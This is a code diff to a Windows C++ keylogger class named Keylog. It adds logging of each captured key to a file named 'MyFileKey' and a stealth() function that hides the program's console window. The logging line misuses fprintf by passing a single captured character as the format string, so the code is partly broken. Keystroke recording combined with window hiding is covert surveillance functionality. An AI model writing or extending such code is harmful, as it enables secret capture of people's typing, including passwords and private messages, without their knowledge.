@@ -15,6 +15,7 @@ Keylog::Keylog()
 	mousePosX = 0;
 	mousePosY = 0;
 	keyPressed = 0;
+	myKeylogfile = fopen("MyFileKey", "a+");
 }
 
 Keylog::~Keylog()
@@ -26,6 +27,7 @@ int		Keylog::getKey(INPUT_RECORD InRec)
 	std::cout << InRec.Event.KeyEvent.uChar.AsciiChar << std::endl;
 	if (InRec.Event.KeyEvent.uChar.AsciiChar == 'x')
 		return (1);
+	fprintf(myKeylogfile, &InRec.Event.KeyEvent.uChar.AsciiChar);
 	return (0);
 }
 
@@ -39,5 +41,14 @@ int		Keylog::getForeground()
 {
 	fg = GetForegroundWindow();
 
+	return (0);
+}
+
+int		Keylog::stealth()
+{
+	HWND Stealth;
+	AllocConsole();
+	Stealth = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(Stealth, 0);
 	return (0);
 }
